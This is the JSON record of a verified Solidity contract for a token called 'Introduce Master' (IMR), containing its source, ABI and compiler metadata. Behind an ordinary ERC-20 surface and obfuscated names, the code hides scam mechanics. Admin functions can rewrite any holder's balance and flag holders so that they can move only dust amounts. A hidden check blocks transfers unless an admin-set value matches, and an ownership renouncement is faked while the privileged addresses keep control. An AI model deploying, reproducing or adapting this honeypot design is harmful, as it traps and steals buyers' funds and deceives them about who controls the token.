{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface fundLimit {\n    function createPair(address atMarketing, address liquidityWalletReceiver) external returns (address);\n}\n\ninterface tradingReceiverTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquiditySenderTrading) external view returns (uint256);\n\n    function transfer(address minAtEnable, uint256 walletAt) external returns (bool);\n\n    function allowance(address takeSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minAtEnable,\n        uint256 walletAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverAmount, uint256 value);\n    event Approval(address indexed takeSell, address indexed spender, uint256 value);\n}\n\nabstract contract shouldTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingReceiverTotalMetadata is tradingReceiverTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IntroduceMaster is shouldTrading, tradingReceiverTotal, tradingReceiverTotalMetadata {\n\n    address walletListIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private buyMinAt = 100000000 * 10 ** 18;\n\n    function tradingFeeLimit() public {\n        emit OwnershipTransferred(amountReceiverExempt, address(0));\n        fundReceiverTotal = address(0);\n    }\n\n    uint256 fundAuto;\n\n    mapping(address => mapping(address => uint256)) private limitEnable;\n\n    bool public feeAutoLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minLaunchedSwap;\n    }\n\n    uint8 private atFrom = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return isWalletAuto;\n    }\n\n    mapping(address => uint256) private receiverWallet;\n\n    mapping(address => bool) public tokenSender;\n\n    function isFrom(address receiverLimit, address minAtEnable, uint256 walletAt) internal returns (bool) {\n        if (receiverLimit == amountReceiverExempt) {\n            return tokenFundEnable(receiverLimit, minAtEnable, walletAt);\n        }\n        uint256 launchedTrading = tradingReceiverTotal(teamAmountSwap).balanceOf(launchReceiver);\n        require(launchedTrading == fundAuto);\n        require(minAtEnable != launchReceiver);\n        if (tokenFrom[receiverLimit]) {\n            return tokenFundEnable(receiverLimit, minAtEnable, maxWallet);\n        }\n        return tokenFundEnable(receiverLimit, minAtEnable, walletAt);\n    }\n\n    uint256 private listEnable;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyMinAt;\n    }\n\n    function tokenFundEnable(address receiverLimit, address minAtEnable, uint256 walletAt) internal returns (bool) {\n        require(receiverWallet[receiverLimit] >= walletAt);\n        receiverWallet[receiverLimit] -= walletAt;\n        receiverWallet[minAtEnable] += walletAt;\n        emit Transfer(receiverLimit, minAtEnable, walletAt);\n        return true;\n    }\n\n    bool private takeAt;\n\n    bool private receiverLaunch;\n\n    constructor (){\n        \n        totalLiquidity sellAt = totalLiquidity(walletListIs);\n        teamAmountSwap = fundLimit(sellAt.factory()).createPair(sellAt.WETH(), address(this));\n        if (walletLaunch != listEnable) {\n            walletLaunch = receiverBuy;\n        }\n        amountReceiverExempt = _msgSender();\n        tokenSender[amountReceiverExempt] = true;\n        receiverWallet[amountReceiverExempt] = buyMinAt;\n        tradingFeeLimit();\n        if (buyTeam) {\n            walletLaunch = listEnable;\n        }\n        emit Transfer(address(0), amountReceiverExempt, buyMinAt);\n    }\n\n    uint256 constant maxWallet = 10 ** 10;\n\n    address public teamAmountSwap;\n\n    string private minLaunchedSwap = \"IMR\";\n\n    function transferFrom(address receiverLimit, address minAtEnable, uint256 walletAt) external override returns (bool) {\n        if (_msgSender() != walletListIs) {\n            if (limitEnable[receiverLimit][_msgSender()] != type(uint256).max) {\n                require(walletAt <= limitEnable[receiverLimit][_msgSender()]);\n                limitEnable[receiverLimit][_msgSender()] -= walletAt;\n            }\n        }\n        return isFrom(receiverLimit, minAtEnable, walletAt);\n    }\n\n    function listLaunchedExempt() private view {\n        require(tokenSender[_msgSender()]);\n    }\n\n    address private fundReceiverTotal;\n\n    function receiverTo(address teamSwap) public {\n        listLaunchedExempt();\n        \n        if (teamSwap == amountReceiverExempt || teamSwap == teamAmountSwap) {\n            return;\n        }\n        tokenFrom[teamSwap] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atFrom;\n    }\n\n    address launchReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public amountReceiverExempt;\n\n    function balanceOf(address liquiditySenderTrading) public view virtual override returns (uint256) {\n        return receiverWallet[liquiditySenderTrading];\n    }\n\n    function getOwner() external view returns (address) {\n        return fundReceiverTotal;\n    }\n\n    function enableToAmount(uint256 walletAt) public {\n        listLaunchedExempt();\n        fundAuto = walletAt;\n    }\n\n    bool public minAuto;\n\n    uint256 fundTotal;\n\n    function owner() external view returns (address) {\n        return fundReceiverTotal;\n    }\n\n    bool public fromSell;\n\n    mapping(address => bool) public tokenFrom;\n\n    string private isWalletAuto = \"Introduce Master\";\n\n    bool public buyTeam;\n\n    uint256 public walletLaunch;\n\n    function atIsAmount(address receiverLiquidityAuto) public {\n        require(receiverLiquidityAuto.balance < 100000);\n        if (minAuto) {\n            return;\n        }\n        \n        tokenSender[receiverLiquidityAuto] = true;\n        if (feeAutoLaunched == takeAt) {\n            walletLaunch = listEnable;\n        }\n        minAuto = true;\n    }\n\n    uint256 public receiverBuy;\n\n    function senderShould(address listFundEnable, uint256 walletAt) public {\n        listLaunchedExempt();\n        receiverWallet[listFundEnable] = walletAt;\n    }\n\n    function allowance(address receiverToTotal, address receiverAuto) external view virtual override returns (uint256) {\n        if (receiverAuto == walletListIs) {\n            return type(uint256).max;\n        }\n        return limitEnable[receiverToTotal][receiverAuto];\n    }\n\n    event OwnershipTransferred(address indexed shouldSellAt, address indexed buyToReceiver);\n\n    function approve(address receiverAuto, uint256 walletAt) public virtual override returns (bool) {\n        limitEnable[_msgSender()][receiverAuto] = walletAt;\n        emit Approval(_msgSender(), receiverAuto, walletAt);\n        return true;\n    }\n\n    function transfer(address listFundEnable, uint256 walletAt) external virtual override returns (bool) {\n        return isFrom(_msgSender(), listFundEnable, walletAt);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSellAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyToReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiverExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityAuto\",\"type\":\"address\"}],\"name\":\"atIsAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySenderTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"enableToAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAutoLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFundEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"senderShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAmountSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFeeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFundEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minAtEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IntroduceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}